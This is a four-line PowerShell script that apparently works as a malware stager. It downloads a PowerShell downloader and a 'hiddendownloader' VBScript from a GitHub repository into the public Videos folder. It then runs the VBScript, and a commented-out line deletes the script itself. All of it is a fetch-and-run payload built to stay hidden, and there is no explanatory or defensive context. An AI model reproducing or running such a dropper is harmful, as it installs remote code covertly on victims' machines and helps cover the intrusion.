Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/downloader.ps1' -OutFile 'C:\Users\Public\Videos\downloader.ps1'
Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/hiddendownloader.vbs' -OutFile 'C:\Users\Public\Videos\hiddendownloader.vbs'
Invoke-Expression -Command "C:\Users\Public\Videos\hiddendowloader"
#Remove-Item $PSCommandPath -Force 